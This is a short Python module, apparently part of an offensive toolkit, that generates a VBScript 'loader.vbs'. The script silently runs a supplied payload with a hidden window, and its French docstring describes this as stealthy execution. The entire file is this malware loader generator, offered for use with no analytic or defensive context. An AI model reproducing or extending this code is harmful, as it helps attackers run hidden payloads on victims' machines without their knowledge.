# modules/loaders/wscript_loader.py
import os

class WScriptLoader:
    def __init__(self):
        pass

    def generate_loader(self, payload_path, output_dir):
        """Crée un script .vbs qui exécute un payload furtivement"""
        script = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{payload_path}", 0, False
        '''.strip()

        output_path = os.path.join(output_dir, "loader.vbs")
        with open(output_path, 'w') as f:
            f.write(script)

        return output_path
